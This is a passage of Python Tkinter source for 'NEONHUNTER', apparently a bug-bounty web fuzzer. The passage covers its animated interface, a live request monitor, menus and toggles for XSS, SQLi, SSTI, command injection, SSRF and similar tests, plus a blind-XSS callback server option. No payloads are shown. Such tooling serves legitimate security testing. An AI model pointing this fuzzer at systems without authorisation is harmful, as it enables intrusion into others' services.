        for i, (label, value, color) in enumerate(targets):
            frame = tk.Frame(target_frame, bg='#000000')
            frame.pack(fill='x', padx=20, pady=10)
            
            tk.Label(frame, text=label, fg='#ffffff', bg='#000000',
                    font=('Consolas', 12)).pack(side='left')
            
            val_label = tk.Label(frame, text=value, fg=color, bg='#000000',
                               font=('Consolas', 12, 'bold'))
            val_label.pack(side='right')
            
            label_key = label.split()[0].replace("🎯", "current").replace("📁", "batch").replace("⏱️", "duration").replace("🔜", "estimated").lower()
            setattr(self, f"target_{label_key}", val_label)
        
        # Configure grid weights
        stats_frame.columnconfigure(0, weight=1)
        stats_frame.columnconfigure(1, weight=1)
        stats_frame.rowconfigure(0, weight=1)
        stats_frame.rowconfigure(1, weight=1)
        
    def animate_ui(self):
        self.draw_cyberpunk_grid()
        self.window.after(50, self.animate_ui)
        
    def draw_cyberpunk_grid(self):
        self.canvas.delete("grid")
        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()
        
        if w < 20 or h < 20:
            return
        
        # Vertical lines
        for i in range(0, int(w), 50):
            alpha = abs(math.sin(time.time() * 2 + i/100)) * 0.3 + 0.1
            color = f"#00{int(255*alpha):02x}{int(255*alpha):02x}"
            self.canvas.create_line(i, 0, i, h, fill=color, width=1, tags="grid")
        
        # Horizontal lines
        for i in range(0, int(h), 50):
            alpha = abs(math.cos(time.time() * 2 + i/100)) * 0.3 + 0.1
            color = f"#{int(255*alpha):02x}00{int(255*alpha):02x}"
            self.canvas.create_line(0, i, w, i, fill=color, width=1, tags="grid")
        
        # Moving dots
        for _ in range(5):
            x = random.randint(0, w)
            y = random.randint(0, h)
            size = random.randint(2, 4)
            color = random.choice(['#00ffff', '#ff00ff', '#ffff00', '#00ff88'])
            self.canvas.create_oval(x, y, x+size, y+size, fill=color, outline=color, tags="grid")

class LiveMonitorWindow:
    def __init__(self, parent):
        self.parent = parent
        self.window = tk.Toplevel(parent)
        self.window.title("📡 LIVE REQUEST MONITOR")
        self.window.configure(bg='#000000')
        self.window.geometry("1200x700+200+150")
        
        self.setup_ui()
        
    def setup_ui(self):
        # Main frame with cyberpunk styling
        main_frame = tk.Frame(self.window, bg='#000000')
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Header
        header_frame = tk.Frame(main_frame, bg='#000000')
        header_frame.pack(fill='x', pady=(0, 20))
        
        tk.Label(header_frame, text="📡 LIVE REQUEST MONITOR", 
                font=('Consolas', 22, 'bold'), 
                fg='#ff00ff', bg='#000000').pack()
        
        tk.Label(header_frame, text="Real-time HTTP Request/Response Tracking", 
                font=('Consolas', 12), 
                fg='#00ffff', bg='#000000').pack()
        
        # Control buttons
        control_frame = tk.Frame(main_frame, bg='#000000')
        control_frame.pack(fill='x', pady=(0, 10))
        
        NeonIconButton(control_frame, text="Clear", icon="🧹", 
                      command=self.clear_logs, color_scheme="danger",
                      width=12).pack(side='left', padx=5)
        
        NeonIconButton(control_frame, text="Pause", icon="⏸️", 
                      command=self.toggle_pause, color_scheme="warning",
                      width=12).pack(side='left', padx=5)
        
        NeonIconButton(control_frame, text="Export", icon="📤", 
                      command=self.export_logs, color_scheme="accent",
                      width=12).pack(side='left', padx=5)
        
        # Filter controls
        filter_frame = tk.Frame(control_frame, bg='#000000')
        filter_frame.pack(side='right', padx=10)
        
        tk.Label(filter_frame, text="🔍 Filter:", fg='#00ff88', bg='#000000',
                font=('Consolas', 10)).pack(side='left', padx=(0, 5))
        
        self.filter_var = tk.StringVar(value="ALL")
        filters = ["ALL", "200", "300", "400", "500", "ERROR"]
        for f in filters:
            tk.Radiobutton(filter_frame, text=f, variable=self.filter_var, value=f,
                          bg='#000000', fg='#00ffff', selectcolor='#000000',
                          font=('Consolas', 9), command=self.apply_filter).pack(side='left', padx=2)
        
        # Live logs display
        log_frame = tk.Frame(main_frame, bg='#111133')
        log_frame.pack(fill='both', expand=True)
        
        # Create text widget with scrollbar
        scrollbar = tk.Scrollbar(log_frame)
        scrollbar.pack(side='right', fill='y')
        
        self.log_text = tk.Text(log_frame, bg='#000011', fg='#00ff41', 
                               font=('Consolas', 9), yscrollcommand=scrollbar.set,
                               wrap='word', insertbackground='#00ffff')
        self.log_text.pack(fill='both', expand=True)
        
        scrollbar.config(command=self.log_text.yview)
        
        # Configure text tags
        self.configure_tags()
        
        # Statistics bar at bottom
        stats_frame = tk.Frame(main_frame, bg='#000000', height=40)
        stats_frame.pack(fill='x', pady=(10, 0))
        stats_frame.pack_propagate(False)
        
        self.stats_label = tk.Label(stats_frame, text="📊 Total: 0 | ✅ 200: 0 | 🔄 300: 0 | ⚠️ 400: 0 | ❌ 500: 0 | 💥 ERR: 0",
                                  fg='#00ffff', bg='#000000', font=('Consolas', 10))
        self.stats_label.pack(pady=10)
        
        # Initialize counters
        self.counters = {'total': 0, '200': 0, '300': 0, '400': 0, '500': 0, 'error': 0}
        self.is_paused = False
        
    def configure_tags(self):
        """Configure text tags for color coding"""
        tags = {
            '200': {'foreground': '#00ff88', 'font': ('Consolas', 9, 'bold')},
            '300': {'foreground': '#ff00ff', 'font': ('Consolas', 9, 'bold')},
            '400': {'foreground': '#ffff00', 'font': ('Consolas', 9)},
            '500': {'foreground': '#ff4444', 'font': ('Consolas', 9, 'bold')},
            'error': {'foreground': '#ff0000', 'font': ('Consolas', 9, 'bold')},
            'info': {'foreground': '#00ccff', 'font': ('Consolas', 9)},
            'highlight': {'background': '#223322', 'foreground': '#ffffff'},
        }
        
        for tag, config in tags.items():
            self.log_text.tag_config(tag, **config)
            
    def add_log(self, method, url, status=None, response_time=None):
        """Add a log entry"""
        if self.is_paused:
            return
            
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        
        # Determine tag based on status
        if status is None:
            tag = 'info'
        elif status == 'ERROR':
            tag = 'error'
        elif 200 <= status < 300:
            tag = '200'
        elif 300 <= status < 400:
            tag = '300'
        elif 400 <= status < 500:
            tag = '400'
        else:
            tag = '500'
        
        # Format the log entry
        if status is None:
            log_entry = f"[{timestamp}] {method.upper()} -> {url}\n"
        elif response_time:
            log_entry = f"[{timestamp}] {method.upper()} -> {url} -> {status} ({response_time:.2f}ms)\n"
        else:
            log_entry = f"[{timestamp}] {method.upper()} -> {url} -> {status}\n"
        
        # Apply filter
        if self.filter_var.get() != "ALL" and str(status) != self.filter_var.get():
            return
            
        # Insert log
        self.log_text.insert(tk.END, log_entry, tag)
        self.log_text.see(tk.END)
        
        # Update counters
        self.update_counters(tag)
        
    def update_counters(self, tag):
        """Update statistics counters"""
        self.counters['total'] += 1
        
        if tag == '200':
            self.counters['200'] += 1
        elif tag == '300':
            self.counters['300'] += 1
        elif tag == '400':
            self.counters['400'] += 1
        elif tag == '500':
            self.counters['500'] += 1
        elif tag == 'error':
            self.counters['error'] += 1
            
        # Update stats label
        stats_text = f"📊 Total: {self.counters['total']} | "
        stats_text += f"✅ 200: {self.counters['200']} | "
        stats_text += f"🔄 300: {self.counters['300']} | "
        stats_text += f"⚠️ 400: {self.counters['400']} | "
        stats_text += f"❌ 500: {self.counters['500']} | "
        stats_text += f"💥 ERR: {self.counters['error']}"
        
        self.stats_label.config(text=stats_text)
        
    def clear_logs(self):
        """Clear all logs"""
        self.log_text.delete(1.0, tk.END)
        self.counters = {'total': 0, '200': 0, '300': 0, '400': 0, '500': 0, 'error': 0}
        self.stats_label.config(text="📊 Total: 0 | ✅ 200: 0 | 🔄 300: 0 | ⚠️ 400: 0 | ❌ 500: 0 | 💥 ERR: 0")
        
    def toggle_pause(self):
        """Toggle pause state"""
        self.is_paused = not self.is_paused
        status = "⏸️ PAUSED" if self.is_paused else "▶️ RESUMED"
        self.log_text.insert(tk.END, f"\n[{datetime.now().strftime('%H:%M:%S')}] {status}\n", 'info')
        self.log_text.see(tk.END)
        
    def apply_filter(self):
        """Apply filter to logs"""
        self.log_text.delete(1.0, tk.END)
        # Note: In a real implementation, you'd want to store logs and re-filter
        
    def export_logs(self):
        """Export logs to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get('1.0', tk.END))
                self.add_log("EXPORT", f"Logs saved to {filename}", None)
            except Exception as e:
                self.add_log("ERROR", f"Failed to export logs: {e}", None)

class AdvancedNeonHunter:
    def __init__(self, root):
        global app
        app = self
        
        self.root = root
        self.root.title("⚡ NEONHUNTER v3.5 - Ultimate Bug Bounty Suite ⚡")
        self.root.configure(bg='#000000')
        self.root.geometry("1600x950")
        self.root.minsize(1400, 800)
        
        # Set current theme
        self.current_theme = "dark"
        
        # Initialize all variables first
        self.initialize_variables()
        
        # Setup keyboard shortcuts
        self.setup_keyboard_shortcuts()
        
        # Setup enhanced menu bar
        self.setup_enhanced_menu_bar()
        
        # Initialize core components
        self.initialize_ui()
        
        # Initialize managers
        self.session_manager = SessionManager()
        self.payload_generator = AdvancedPayloadGenerator()
        self.batch_processor = BatchProcessor(self)
        
        # Setup advanced UI
        self.setup_enhanced_ui()
        
        # Load configuration
        self.load_config()
        
        # Start advanced features (delayed to ensure UI is fully initialized)
        self.root.after(1000, self.start_advanced_features)
        
        # Play startup sound
        self.play_startup_sound()
        self.log("⚡ NEONHUNTER v3.5 READY - By Dickson Godwin Massawe")
        self.log("🎨 ENHANCED UI WITH MULTI-WINDOW SUPPORT")
        self.log("📊 Professional Dashboard Activated")
        self.log("🔧 Advanced Features Enabled")
        
        # Open dashboard by default (delayed to ensure UI is ready)
        self.root.after(1500, self.open_dashboard)



    def load_targets_from_file(self):
        """Wrapper method to load targets file"""
        return self.batch_processor.load_targets_from_file_gui()
        
    def initialize_variables(self):
        """Initialize all variables first before UI creation"""
        self.dashboard = None
        self.live_monitor = None
        self.status_window = None
        self.live_text = None
        self.status_text = None
        
        self.fuzz_thread = None
        self.is_running = False
        self.is_paused = False
        self.stop_event = threading.Event()
        
        self.results = []
        self.log_queue = pyqueue.Queue()
        self.blind_server = None
        self.callback_ip = self.get_local_ip()
        
        self.scan_start_time = None
        self.total_payloads_tested = 0
        self.vuln_counter = 0
        
        # Enhanced statistics
        self.stats = {
            'requests_sent': 0,
            'requests_success': 0,
            'errors': 0,
            'warnings': 0,
            'critical_findings': 0,
            'high_findings': 0,
            'medium_findings': 0,
            'low_findings': 0,
            'start_time': None,
            'end_time': None,
            'scan_duration': '0s',
            'payloads_per_second': 0,
        }
        
        # Initialize theme settings
        self.theme_settings_config = {
            'font_size': 10,
            'contrast': 'high',
            'animation': True,
            'sound': True,
        }
        
        # Initialize UI variables
        self.title_label = None
        self.subtitle_label = None
        self.target_entry = None
        self.proxy_entry = None
        self.delay_var = None
        self.concurrent_requests = None
        self.timeout_var = None
        self.retry_count = None
        self.rate_limit_var = None
        self.auto_save_var = None
        self.fuzz_btn = None
        self.pause_btn = None
        self.stop_btn = None
        self.progress = None
        self.status_indicator = None
        self.status_text_widget = None
        self.log_text = None
        self.log_search = None
        self.stats_display = None
        self.author_label = None
        self.vulns = {}
        self.payloads = {}
        self.custom_payloads = {}
        
        # Start queue processor
        self.root.after(100, self.process_queue)
        
    def setup_keyboard_shortcuts(self):
        """Setup keyboard shortcuts with more options"""
        shortcuts = [
            ('<Control-o>', lambda e: self.load_targets_from_file()),
            ('<Control-s>', lambda e: self.save_config()),
            ('<Control-l>', lambda e: self.load_config()),
            ('<Control-f>', lambda e: self.start_direct_fuzz()),
            ('<Control-p>', lambda e: self.toggle_pause()),
            ('<Control-q>', lambda e: self.stop_fuzz()),
            ('<Control-e>', lambda e: self.export_advanced_results()),
            ('<Control-b>', lambda e: self.start_batch_scan()),
            ('<Control-r>', lambda e: self.clear_monitors()),
            ('<F1>', lambda e: self.show_help()),
            ('<F5>', lambda e: self.check_for_updates()),
            ('<F2>', lambda e: self.open_dashboard()),
            ('<F3>', lambda e: self.take_manual_screenshot()),
            ('<Control-d>', lambda e: self.show_documentation()),
            ('<Control-t>', lambda e: self.test_connection()),
            ('<Control-m>', lambda e: self.open_live_monitor()),
            ('<F11>', lambda e: self.toggle_fullscreen()),
        ]
        
        for shortcut, command in shortcuts:
            self.root.bind(shortcut, command)
            
    def toggle_fullscreen(self):
        """Toggle fullscreen mode"""
        self.root.attributes('-fullscreen', not self.root.attributes('-fullscreen'))
        
    def open_dashboard(self):
        """Open dashboard window"""
        if not hasattr(self, 'dashboard') or not self.dashboard or not self.dashboard.window.winfo_exists():
            self.dashboard = DashboardWindow(self.root)
            
    def open_live_monitor(self):
        """Open live monitor window"""
        if not hasattr(self, 'live_monitor') or not self.live_monitor or not self.live_monitor.window.winfo_exists():
            self.live_monitor = LiveMonitorWindow(self.root)
            
    def setup_enhanced_menu_bar(self):
        """Setup enhanced menu bar with icons"""
        menubar = tk.Menu(self.root, bg='#000000', fg='#00ffff', 
                         activebackground='#00ffff', activeforeground='#000000',
                         font=('Consolas', 10))
        self.root.config(menu=menubar)
        
        # File Menu with icons
        file_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#00ffff',
                          activebackground='#00ffff', activeforeground='#000000')
        menubar.add_cascade(label="📁 File", menu=file_menu)
        file_menu.add_command(label="📂 Load Targets File", 
                            accelerator="Ctrl+O",
                            command=self.load_targets_from_file)
        file_menu.add_command(label="💾 Save Config", 
                            accelerator="Ctrl+S",
                            command=self.save_config)
        file_menu.add_command(label="📥 Load Config", 
                            accelerator="Ctrl+L",
                            command=self.load_config)
        file_menu.add_separator()
        file_menu.add_command(label="📊 Export Report", 
                            accelerator="Ctrl+E",
                            command=self.export_advanced_results)
        file_menu.add_command(label="📈 Export Statistics", 
                            command=self.export_statistics)
        file_menu.add_separator()
        file_menu.add_command(label="📸 Take Screenshot", 
                            accelerator="F3",
                            command=self.take_manual_screenshot)
        file_menu.add_separator()
        file_menu.add_command(label="🚪 Exit", 
                            accelerator="Alt+F4",
                            command=self.on_closing)
        
        # Scan Menu with icons
        scan_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#ff00ff',
                          activebackground='#ff00ff', activeforeground='#000000')
        menubar.add_cascade(label="🔍 Scan", menu=scan_menu)
        scan_menu.add_command(label="🚀 Start Fuzzing", 
                            accelerator="Ctrl+F",
                            command=self.start_direct_fuzz)
        scan_menu.add_command(label="⏯️ Pause/Resume", 
                            accelerator="Ctrl+P",
                            command=self.toggle_pause)
        scan_menu.add_command(label="⏹️ Stop Scan", 
                            accelerator="Ctrl+Q",
                            command=self.stop_fuzz)
        scan_menu.add_separator()
        scan_menu.add_command(label="📋 Batch Scan", 
                            accelerator="Ctrl+B",
                            command=self.start_batch_scan)
        scan_menu.add_command(label="⚡ Quick Scan", 
                            command=self.quick_scan)
        scan_menu.add_command(label="🔬 Deep Scan", 
                            command=self.deep_scan)
        scan_menu.add_separator()
        scan_menu.add_command(label="🧹 Clear Monitors", 
                            accelerator="Ctrl+R",
                            command=self.clear_monitors)
        
        # View Menu with icons
        view_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#00ccff',
                          activebackground='#00ccff', activeforeground='#000000')
        menubar.add_cascade(label="👁️ View", menu=view_menu)
        view_menu.add_command(label="📊 Dashboard", 
                            accelerator="F2",
                            command=self.open_dashboard)
        view_menu.add_command(label="📡 Live Monitor", 
                            accelerator="Ctrl+M",
                            command=self.open_live_monitor)
        view_menu.add_command(label="🎨 Theme Settings", 
                            command=self.theme_settings)
        view_menu.add_command(label="👁️‍🗨️ Color Blind Mode", 
                            command=self.toggle_color_blind_mode)
        view_menu.add_separator()
        view_menu.add_command(label="🔍 Zoom In", 
                            command=lambda: self.zoom_text(1.1))
        view_menu.add_command(label="🔎 Zoom Out", 
                            command=lambda: self.zoom_text(0.9))
        view_menu.add_command(label="🔧 Reset Zoom", 
                            command=lambda: self.zoom_text(1.0))
        view_menu.add_separator()
        view_menu.add_command(label="🖥️ Toggle Fullscreen", 
                            accelerator="F11",
                            command=self.toggle_fullscreen)
        
        # Tools Menu with icons
        tools_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#00ff88',
                   activebackground='#00ff88', activeforeground='#000000')
        menubar.add_cascade(label="🛠️ Tools", menu=tools_menu)
        
        tools_menu.add_command(label="👤 Session Manager", 
                            command=self.manage_sessions)
        tools_menu.add_command(label="💣 Custom Payloads", 
                            command=self.customize_payloads)
        tools_menu.add_command(label="📤 Payload Importer", 
                      command=self.import_custom_payloads)
        tools_menu.add_command(label="🎯 Blind XSS Server", 
                            command=self.start_blind_server)
        tools_menu.add_command(label="📸 Screenshot Tool",
                      command=self.take_manual_screenshot)
        tools_menu.add_command(label="🔌 Test Connection", 
                            accelerator="Ctrl+T",
                            command=self.test_connection)
        tools_menu.add_command(label="↩️ Replay Request", 
                            command=self.replay_request)
        tools_menu.add_command(label="📏 Header Analyzer", 
                            command=self.analyze_headers)
        tools_menu.add_command(label="🔐 SSL Checker", 
                            command=self.check_ssl)
        
        # Help Menu with icons
        help_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#ffff00',
                          activebackground='#ffff00', activeforeground='#000000')
        menubar.add_cascade(label="❓ Help", menu=help_menu)
        help_menu.add_command(label="📚 Documentation", 
                            accelerator="Ctrl+D",
                            command=self.show_documentation)
        help_menu.add_command(label="📖 Quick Guide", 
                            accelerator="F1",
                            command=self.show_help)
        help_menu.add_command(label="🔄 Check Updates", 
                            accelerator="F5",
                            command=self.check_for_updates)
        help_menu.add_command(label="⌨️ Keyboard Shortcuts", 
                            command=self.show_keyboard_shortcuts)
        help_menu.add_separator()
        help_menu.add_command(label="🌟 About NeonHunter", 
                            command=self.show_about)
        help_menu.add_command(label="📖 Project Documentation", 
                            command=self.show_project_docs)
        help_menu.add_command(label="🎬 Tutorial Videos", 
                            command=self.show_tutorials)
        help_menu.add_command(label="🐛 Report Bug", 
                            command=self.report_bug)
        help_menu.add_command(label="💡 Feature Request", 
                            command=self.request_feature)
        
    def initialize_ui(self):
        """Initialize the main UI components with cyberpunk styling"""
        main_frame = tk.Frame(self.root, bg='#000000')
        main_frame.pack(fill='both', expand=True, padx=15, pady=15)
        
        # Cyberpunk grid background
        self.bg_canvas = tk.Canvas(main_frame, bg='#000000', highlightthickness=0)
        self.bg_canvas.place(relwidth=1, relheight=1)
        
        # Animated border
        self.border_canvas = tk.Canvas(main_frame, bg='#000000', highlightthickness=0)
        self.border_canvas.place(relwidth=1, relheight=1)
        
        # Initialize animation
        self.border_segments = 100
        self.border_colors = cycle(['#ff00ff', '#00ffff', '#ffff00', '#00ff88', '#ff4444'])
        self.border_offset = 0
        self.start_animations()
        
        # Enhanced Title with neon effects
        title_frame = tk.Frame(main_frame, bg='#000000')
        title_frame.place(relx=0.5, rely=0.06, anchor='center')
        
        self.title_label = tk.Label(title_frame, text="⚡ NEONHUNTER v3.5", 
                                   font=('Consolas', 48, 'bold'), 
                                   fg='#00ffff', bg='#000000')
        self.title_label.pack()
        
        # Add glow effect
        self.subtitle_label = tk.Label(title_frame, 
                                      text="🎯 Ultimate Bug Bounty Suite | 👤 By Dickson Godwin Massawe",
                                      font=('Consolas', 14), 
                                      fg='#ff00ff', bg='#000000')
        self.subtitle_label.pack()
        
        # Animate title
        threading.Thread(target=self.glitch_title, daemon=True).start()
        
        # Configure enhanced styles
        self.configure_enhanced_styles()
        
        # Create main controls with better visibility
        self.create_enhanced_main_controls(main_frame)
        
        # Create enhanced log area
        self.create_enhanced_log_area(main_frame)
        
        # Enhanced Footer
        self.create_enhanced_footer(main_frame)
        
        # Draw initial grid
        self.draw_cyberpunk_grid()
        
    def start_animations(self):
        """Start all background animations"""
        self.draw_cyberpunk_grid()
        self.draw_animated_border()
        self.root.after(50, self.start_animations)
        
    def draw_cyberpunk_grid(self):
        """Draw cyberpunk grid background"""
        self.bg_canvas.delete("grid")
        w = self.bg_canvas.winfo_width()
        h = self.bg_canvas.winfo_height()
        
        if w < 20 or h < 20:
            return
        
        # Draw vertical lines with pulse effect
        for i in range(0, int(w), 30):
            alpha = abs(math.sin(time.time() + i/200)) * 0.2 + 0.05
            color = f"#00{int(255*alpha):02x}{int(255*alpha):02x}"
            self.bg_canvas.create_line(i, 0, i, h, fill=color, width=1, tags="grid")
            
        # Draw horizontal lines with different pulse
        for i in range(0, int(h), 30):
            alpha = abs(math.cos(time.time() + i/200)) * 0.2 + 0.05
            color = f"#{int(255*alpha):02x}00{int(255*alpha):02x}"
            self.bg_canvas.create_line(0, i, w, i, fill=color, width=1, tags="grid")
            
        # Add floating particles
        for _ in range(10):
            x = random.randint(0, w)
            y = random.randint(0, h)
            size = random.randint(1, 3)
            color = random.choice(['#00ffff', '#ff00ff', '#ffff00', '#00ff88'])
            self.bg_canvas.create_oval(x, y, x+size, y+size, 
                                      fill=color, outline=color, tags="grid")
            
    def draw_animated_border(self):
        """Draw animated border around main frame"""
        self.border_canvas.delete("border")
        w = self.border_canvas.winfo_width()
        h = self.border_canvas.winfo_height()
        
        if w < 20 or h < 20:
            return
        
        # Draw animated border segments
        segment_length = 20
        segments_h = int(w / segment_length)
        segments_v = int(h / segment_length)
        
        # Top border
        for i in range(segments_h):
            x1 = i * segment_length
            x2 = (i + 1) * segment_length
            color = next(self.border_colors) if (i + self.border_offset) % 5 == 0 else '#330066'
            self.border_canvas.create_line(x1, 2, x2, 2, fill=color, width=3, tags="border")
            
        # Bottom border
        for i in range(segments_h):
            x1 = i * segment_length
            x2 = (i + 1) * segment_length
            color = next(self.border_colors) if (i + self.border_offset + 2) % 5 == 0 else '#330066'
            self.border_canvas.create_line(x1, h-2, x2, h-2, fill=color, width=3, tags="border")
            
        # Left border
        for i in range(segments_v):
            y1 = i * segment_length
            y2 = (i + 1) * segment_length
            color = next(self.border_colors) if (i + self.border_offset + 1) % 5 == 0 else '#330066'
            self.border_canvas.create_line(2, y1, 2, y2, fill=color, width=3, tags="border")
            
        # Right border
        for i in range(segments_v):
            y1 = i * segment_length
            y2 = (i + 1) * segment_length
            color = next(self.border_colors) if (i + self.border_offset + 3) % 5 == 0 else '#330066'
            self.border_canvas.create_line(w-2, y1, w-2, y2, fill=color, width=3, tags="border")
            
        self.border_offset = (self.border_offset + 1) % 5
        
    def glitch_title(self):
        """Animate title with glitch effect"""
        colors = ['#00ffff', '#ff00ff', '#ffff00', '#00ff88', '#ff6600']
        while True:
            time.sleep(0.3)
            if self.title_label:
                # Random glitch effect
                if random.random() < 0.3:  # 30% chance for glitch
                    glitch_color = random.choice(colors)
                    self.title_label.config(fg=glitch_color)
                    
                    # Random offset
                    offset_x = random.randint(-2, 2)
                    offset_y = random.randint(-2, 2)
                    self.title_label.place(x=offset_x, y=offset_y)
                    
                    time.sleep(0.05)
                    self.title_label.place(x=0, y=0)
                    self.title_label.config(fg='#00ffff')
                    
    def configure_enhanced_styles(self):
        """Configure enhanced ttk styles"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Enhanced entry style
        style.configure('Cyber.TEntry',
                        fieldbackground='#111133',
                        foreground='#00ffcc',
                        insertcolor='#00ffff',
                        borderwidth=3,
                        padding=10,
                        font=('Consolas', 11),
                        relief='sunken')
        
        # Enhanced progress bar
        style.configure('Cyber.Horizontal.TProgressbar',
                        background='linear',
                        troughcolor='#110033',
                        bordercolor='#00ffff',
                        lightcolor='#00ffff',
                        darkcolor='#0088cc',
                        thickness=25)
        
        # Configure custom colors
        style.map('Cyber.TEntry',
                 fieldbackground=[('active', '#222255')],
                 foreground=[('active', '#ffffff')])
                 
    def create_enhanced_main_controls(self, parent):
        """Create enhanced main control widgets with cyberpunk styling"""
        controls_frame = tk.Frame(parent, bg='#000000', relief='ridge', bd=3)
        controls_frame.pack(pady=10, fill='x', padx=20)
        
        # Target URL Section with neon styling
        url_frame = tk.Frame(controls_frame, bg='#000000')
        url_frame.pack(fill='x', padx=20, pady=15)
        
        tk.Label(url_frame, text="🎯 Target URL:", fg='#00ffff', bg='#000000', 
                font=('Consolas', 14, 'bold')).pack(side='left', padx=5)
        
        self.target_entry = tk.Entry(url_frame, width=80, font=('Consolas', 12), 
                                    bg='#111133', fg='#00ffcc',
                                    relief='sunken', bd=3, insertbackground='#00ffff',
                                    insertwidth=4)
        self.target_entry.pack(side='left', padx=15, fill='x', expand=True)
        self.target_entry.insert(0, "http://testphp.vulnweb.com/listproducts.php?cat=1")
        
        # Add hover effect to entry
        self.target_entry.bind('<Enter>', lambda e: self.target_entry.config(bg='#222255'))
        self.target_entry.bind('<Leave>', lambda e: self.target_entry.config(bg='#111133'))
        
        # Quick actions for URL
        quick_frame = tk.Frame(url_frame, bg='#000000')
        quick_frame.pack(side='left', padx=10)
        
        NeonIconButton(quick_frame, text="Test", icon="🔌", 
                      command=self.test_connection, width=8).pack(side='left', padx=2)
        NeonIconButton(quick_frame, text="Copy", icon="📋", 
                      command=self.copy_url, width=8).pack(side='left', padx=2)
        NeonIconButton(quick_frame, text="Clear", icon="🧹", 
                      command=lambda: self.target_entry.delete(0, tk.END), width=8).pack(side='left', padx=2)
        
        # Settings Section
        settings_frame = tk.Frame(controls_frame, bg='#000000')
        settings_frame.pack(fill='x', padx=20, pady=10)
        
        # Delay setting
        delay_frame = tk.Frame(settings_frame, bg='#000000')
        delay_frame.pack(side='left', padx=5)
        
        tk.Label(delay_frame, text="⏱️ Delay(s):", fg='#ff00ff', bg='#000000', 
                font=('Consolas', 12)).pack(side='left')
        
        self.delay_var = tk.DoubleVar(value=0.5)
        delay_entry = tk.Entry(delay_frame, textvariable=self.delay_var, width=8, 
                             bg='#111133', fg='#00ffcc', font=('Consolas', 11))
        delay_entry.pack(side='left', padx=5)
        
        # Proxy setting
        proxy_frame = tk.Frame(settings_frame, bg='#000000')
        proxy_frame.pack(side='left', padx=30)
        
        tk.Label(proxy_frame, text="🌐 Proxy:", fg='#00ff88', bg='#000000',
                font=('Consolas', 12)).pack(side='left')
        
        self.proxy_entry = tk.Entry(proxy_frame, width=40, bg='#111133', 
                                   fg='#00ffcc', font=('Consolas', 11))
        self.proxy_entry.pack(side='left', padx=5)
        
        # Initialize additional settings variables
        self.concurrent_requests = tk.IntVar(value=3)
        self.timeout_var = tk.IntVar(value=15)
        self.retry_count = tk.IntVar(value=2)
        self.rate_limit_var = tk.BooleanVar(value=True)
        self.auto_save_var = tk.BooleanVar(value=True)
        
        # Action buttons with cyberpunk styling
        buttons_frame = tk.Frame(controls_frame, bg='#000000')
        buttons_frame.pack(pady=15)
        
        self.fuzz_btn = NeonIconButton(buttons_frame, text="🚀 START FUZZING", 
                                      command=self.start_direct_fuzz, 
                                      color_scheme="accent", width=18)
        self.fuzz_btn.pack(side='left', padx=10)
        
        self.pause_btn = NeonIconButton(buttons_frame, text="⏯️ PAUSE", 
                                       command=self.toggle_pause, 
                                       color_scheme="warning", width=14, state='disabled')
        self.pause_btn.pack(side='left', padx=10)
        
        self.stop_btn = NeonIconButton(buttons_frame, text="⏹️ STOP", 
                                      command=self.stop_fuzz, 
                                      color_scheme="danger", width=14, state='disabled')
        self.stop_btn.pack(side='left', padx=10)
        
        NeonIconButton(buttons_frame, text="📊 DASHBOARD", 
                      command=self.open_dashboard, width=14).pack(side='left', padx=10)
        
        NeonIconButton(buttons_frame, text="📋 BATCH", 
                      command=self.start_batch_scan, width=14).pack(side='left', padx=10)
        
        # Vulnerability toggles - Enhanced with cyberpunk styling
        vuln_frame = tk.LabelFrame(controls_frame, text="🔍 VULNERABILITIES TO TEST", 
                                  font=('Consolas', 13, 'bold'),
                                  fg='#00ffff', bg='#000000',
                                  labelanchor='n', bd=3, relief='ridge')
        vuln_frame.pack(fill='x', padx=40, pady=15)
        
        toggle_container = tk.Frame(vuln_frame, bg='#000000')
        toggle_container.pack(pady=12, padx=20)
        
        vuln_data = [
            ('XSS', '💉', '#ff0000'),
            ('SQLi', '🗄️', '#ff6600'),
            ('SSTI', '📄', '#ffff00'),
            ('Open Redirect', '↪️', '#00ff00'),
            ('HPP', '🔄', '#00ccff'),
            ('LFI', '📂', '#6600ff'),
            ('Command Injection', '💻', '#ff00ff'),
            ('XXE', '📋', '#ff0088'),
            ('SSRF', '🔄', '#00ff88'),
            ('JWT', '🔑', '#ffff88'),
        ]
        
        for i, (name, icon, color) in enumerate(vuln_data):
            var = tk.BooleanVar(value=True if name in ['XSS', 'SQLi', 'SSTI'] else False)
            self.vulns[name] = var
            
            row = tk.Frame(toggle_container, bg='#000000')
            row.grid(row=i//5, column=i%5, padx=15, pady=10, sticky='w')
            
            # Toggle switch
            AdvancedNeonToggle(row, variable=var, toggle_width=70, toggle_height=30).pack(side='left', padx=5)
            
            # Vulnerability name with icon and hover effect
            label = tk.Label(row, text=f"{icon} {name}", fg=color, bg='#000000', 
                            font=('Consolas', 11, 'bold'), cursor='hand2')
            label.pack(side='left', padx=8)
            
            # Add click functionality to label
            label.bind('<Button-1>', lambda e, v=var: v.set(not v.get()))
            label.bind('<Enter>', lambda e, l=label, c=color: l.config(fg='#ffffff'))
            label.bind('<Leave>', lambda e, l=label, c=color: l.config(fg=c))
        
        # Enhanced progress bar with cyberpunk styling
        progress_frame = tk.Frame(controls_frame, bg='#000000')
        progress_frame.pack(pady=15)
        
        self.progress = ttk.Progressbar(progress_frame, orient='horizontal', 
                                       mode='indeterminate', 
                                       style='Cyber.Horizontal.TProgressbar',
                                       length=500)
        self.progress.pack()
        
        # Add progress percentage label
        self.progress_label = tk.Label(progress_frame, text="0%", fg='#00ffff', 
                                      bg='#000000', font=('Consolas', 10, 'bold'))
        self.progress_label.pack(pady=5)
        
        # Status indicator with neon animation
        self.status_frame = tk.Frame(controls_frame, bg='#000000')
        self.status_frame.pack(pady=10)
        
        self.status_indicator = tk.Label(self.status_frame, text="●", fg='#00ff00',
